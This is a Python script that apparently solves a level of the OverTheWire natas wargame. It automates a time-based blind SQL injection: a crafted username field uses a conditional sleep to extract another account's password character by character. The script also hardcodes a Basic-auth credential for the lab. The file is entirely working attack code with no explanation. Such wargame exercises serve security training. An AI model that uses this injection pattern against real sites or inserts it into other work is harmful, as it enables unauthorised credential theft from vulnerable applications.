import requests
import string
import sys

chars = list(string.lowercase + string.uppercase + string.digits)

url = "http://natas17.natas.labs.overthewire.org/index.php"
headers = {
  'authorization': "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==",
  'content-type': "application/x-www-form-urlencoded"
}

password = ""

while True:
  for char in chars:
    response = requests.request("POST", url, data='username=natas18" AND IF(password LIKE BINARY "' + password + char + '%", sleep(2), null) AND ""="', headers=headers)
    
    if response.elapsed.total_seconds() > 1.9:
      password += char
      sys.stdout.write("\rpassword: %s" % password)
      sys.stdout.flush()
      response = requests.request("POST", url, data='username=natas18" AND IF(password ="' + password + '", sleep(2), null) AND ""="', headers=headers)
      if response.elapsed.total_seconds() > 1.9:
        print "\n"
        sys.exit()
      break